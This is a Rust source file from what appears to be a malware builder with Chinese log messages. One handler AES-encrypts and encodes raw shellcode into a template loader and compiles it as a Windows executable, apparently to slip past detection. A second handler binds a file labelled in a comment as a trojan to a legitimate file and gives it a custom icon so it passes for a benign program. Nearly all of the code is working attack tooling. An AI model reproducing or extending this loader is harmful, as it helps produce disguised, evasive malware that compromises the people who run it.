use std::fs::{create_dir_all, read, remove_dir_all, write};
use std::path::Path;
use std::process::{Command, Stdio};
use std::ptr::null;

use aes::Aes256;
use rust_embed::RustEmbed;

use crate::utils;
use crate::utils::aesEncrypt;

pub trait Loader {
    fn load(&self);
}


#[derive(RustEmbed)]
#[folder = "temp"]
struct temFile;

const key_placeholder: &str = "${key}";
const iv_placeholder: &str = "${iv}";
const base64Str_placeholder: &str = "${base64Str}";
const package_placeholder: &str = "${packageName}";
const hexCode_placeholder: &str = "${hexCode}";

impl Loader for ShellCodeHandler {
    fn load(&self) {
        println!("shellcode 处理中。。。");
        let shellcode = match read(&self.file_path) {
            Ok(res) => res,
            Err(err) => {
                println!("{}", err);
                std::process::exit(1);
            }
        };

        let mainFile = temFile::get("shellcode/main.rs").unwrap();
        let cargoToml = temFile::get("shellcode/Cargo.toml").unwrap();
        let buildRs = temFile::get("shellcode/build.rs").unwrap();
        let mainFile_str = std::str::from_utf8(mainFile.data.as_ref()).unwrap();
        let cargoToml_str = std::str::from_utf8(cargoToml.data.as_ref()).unwrap();
        let buildRs_str = std::str::from_utf8(buildRs.data.as_ref()).unwrap();

        let (key, iv, ciphertext) = aesEncrypt(shellcode);

        let base64_str = base64::encode(&ciphertext);
        let mainFile_str = &mainFile_str.replace(&iv_placeholder, &iv);
        let mainFile_str = &mainFile_str.replace(&key_placeholder, &key);
        let mainFile_str = &mainFile_str.replace(&hexCode_placeholder, &hex::encode(&base64_str));
        let cargoToml_str = &cargoToml_str.replace(&package_placeholder, &self.package_name);


        if Some(&self.ico).is_some() & !&self.ico.is_empty() {
            println!("ico:{}", self.ico);
            let ico = read(&self.ico).unwrap();
            let _ = write(format!("loader/ck.ico"), ico);
        }

        let _ = create_dir_all("loader/src");
        let _ = create_dir_all("loader/.cargo");
        let _ = write(format!("loader/src/main.rs"), mainFile_str);
        let _ = write(format!("loader/Cargo.toml"), cargoToml_str);
        let _ = write(format!("loader/build.rs"), buildRs_str);
        complie();
    }
}

impl Loader for BindHandler {
    fn load(&self) {
        println!("捆绑文件中。。。");
        let path = Path::new(&self.file_path);
        let file_name = path.file_name().unwrap().to_str().unwrap();
        let file_stem_name = path.file_stem().unwrap().to_str().unwrap();

        let mainFile = temFile::get("sleeve/main.rs").unwrap();
        let cargoToml = temFile::get("sleeve/Cargo.toml").unwrap();
        let buildRs = temFile::get("sleeve/build.rs").unwrap();
        let mainFile_str = std::str::from_utf8(mainFile.data.as_ref()).unwrap();
        let buildRs_str = std::str::from_utf8(buildRs.data.as_ref()).unwrap();
        let cargoToml_str = std::str::from_utf8(cargoToml.data.as_ref()).unwrap();


        let cargoToml_str = &cargoToml_str.replace(&package_placeholder, file_stem_name);

        if Some(&self.ico).is_some() & !&self.ico.is_empty() {
            println!("ico:{}", self.ico);
            let ico = read(&self.ico).unwrap();
            let _ = write(format!("loader/ck.ico"), ico);
        }

        let _ = create_dir_all("loader/src");
        let _ = create_dir_all("loader/tep");
        let _ = create_dir_all("loader/.cargo");
        let _ = write(format!("loader/src/main.rs"), mainFile_str);
        let _ = write(format!("loader/build.rs"), buildRs_str);
        let _ = write(format!("loader/Cargo.toml"), cargoToml_str);

        println!("copying file....");

        let file = read(self.file_path.clone()).expect(&format!("文件读取失败：{}", &self.file_path));

        let _ = write(format!("loader/tep/{}", file_name), file);

        //木马文件
        println!("{}", &self.trojan_file_path);
        let trojan_file = read(&self.trojan_file_path).expect(&format!("文件读取失败：{}", &self.trojan_file_path));
        let _ = write(format!("loader/tep/{}.exe", file_stem_name), trojan_file);

         complie();
    }
}

pub fn complie() {
    println!("开始编译...");
    let mut cmd = Command::new("cmd")
        .arg("/c")
        .arg("cd loader && cargo build -Z unstable-options --out-dir ../ --target x86_64-pc-windows-msvc  --release")
        .spawn()
        .expect("编译失败！");

    let status = cmd.wait();
    let _ = remove_dir_all("loader");
}


pub struct ShellCodeHandler {
    pub(crate) file_path: String,
    pub(crate) package_name: String,
    pub(crate) ico: String,
}

pub struct BindHandler {
    pub(crate) file_path: String,
    pub(crate) trojan_file_path: String,
    pub(crate) ico: String,
}

